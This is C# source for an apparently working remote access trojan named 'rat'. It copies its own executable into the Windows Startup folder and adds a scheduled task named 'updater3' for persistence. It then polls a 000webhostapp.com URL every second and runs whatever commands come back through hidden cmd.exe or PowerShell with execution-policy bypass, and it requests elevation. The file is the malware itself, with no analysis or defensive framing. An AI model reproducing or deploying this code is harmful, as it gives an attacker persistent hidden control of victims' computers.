using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Threading;
using System.IO;

using System.Management.Automation.Runspaces;

namespace rat
{
    class Program
    {
        private static void addwmipersistence()
        {
            string exepath = System.IO.Path.GetDirectoryName(System.Reflection.Assembly.GetEntryAssembly().Location);
            string exename = System.AppDomain.CurrentDomain.FriendlyName;
            string pathnameexe;
            if (exepath[exepath.Length - 1] == '\\')
            {
                pathnameexe = exepath + exename;
            }
            else
            {
                pathnameexe = exepath + "\\" + exename;
            }
            string script = @"schtasks /Create /SC ONIDLE /I 1 /TN updater3 /TR ""powershell.exe cd " + exepath + @"; .\" + exename + @" """;
            // MessageBox.Show(script);
            Runspace rspace = RunspaceFactory.CreateRunspace();
            rspace.Open();
            Pipeline pipl = rspace.CreatePipeline();
            pipl.Commands.AddScript(script);
            pipl.Commands.Add("Out-String");
            pipl.Invoke();
            rspace.Close();

        }
        static void Main(string[] args)
        {
            string lo = System.Reflection.Assembly.GetEntryAssembly().Location;
            //Console.WriteLine(lo);
            string currnt_user_name = Environment.UserName;
            string file = @"C:\Users\" + currnt_user_name + @"\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\rat.exe";
            string file_loc = @"C:\Users\" + currnt_user_name + @"\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\";
            file = "\"" +file+ "\"" ;
            file_loc= "\"" + file_loc + "\"";
            lo = "\"" + lo + "\"";
            if (!File.Exists(file))
            {
                Process cmd2 = new Process();
                cmd2.StartInfo.FileName = "cmd.exe";
                cmd2.StartInfo.RedirectStandardInput = true;
                cmd2.StartInfo.RedirectStandardOutput = true;
                cmd2.StartInfo.CreateNoWindow = true;
                cmd2.StartInfo.UseShellExecute = false;
                cmd2.Start();
                cmd2.StandardInput.WriteLine(@"C:");
                cmd2.StandardInput.WriteLine(@"cd  " + file_loc+"");
                cmd2.StandardInput.WriteLine(@"xcopy "+lo+@" rat.exe");
                cmd2.StandardInput.WriteLine(@"F");
                cmd2.StandardInput.WriteLine(@"Yes");
                cmd2.StandardInput.Flush();
                cmd2.StandardInput.Close();
                cmd2.WaitForExit();
                Console.WriteLine(cmd2.StandardOutput.ReadToEnd());


            }
            try { addwmipersistence(); } 
            catch (Exception)
            { }
           
            string json ="";
            string oldjson = "as";
            int chk = 0;
           while(chk==0)
            {
                try
                {
                    json = new WebClient().DownloadString("https://ustaad-mailer.000webhostapp.com/go.php");
                    if (json != oldjson)
                    {

                        if (json.Contains("curl.exe"))
                        {
                            System.Diagnostics.Process.Start("CMD.exe", "/C powershell -w h -ep bypass "+json);
                        }
                        else
                        {
                            Process cmd = new Process();
                            cmd.StartInfo.FileName = "cmd.exe";
                            cmd.StartInfo.RedirectStandardInput = true;
                            cmd.StartInfo.RedirectStandardOutput = true;
                            cmd.StartInfo.CreateNoWindow = true;
                            cmd.StartInfo.UseShellExecute = false;

                            cmd.StartInfo.Verb = "runas";
                            cmd.Start();

                            cmd.StandardInput.WriteLine(json);
                        }
                        //cmd.StandardInput.Flush();
                        //cmd.StandardInput.Close();
                        // cmd.WaitForExit();
                        // Console.WriteLine(cmd.StandardOutput.ReadToEnd());

                        Console.WriteLine("diff result json=" + json + "old=" + oldjson);
                    }
                    else
                    {
                        Console.WriteLine("same result json="+json+"old="+oldjson);
                    }
                    

                    oldjson = json;
                }
                catch (Exception e)
                {
                    Console.WriteLine("Connection not stable.");
                }
                Thread.Sleep(1000);

            }



        }
    }
}
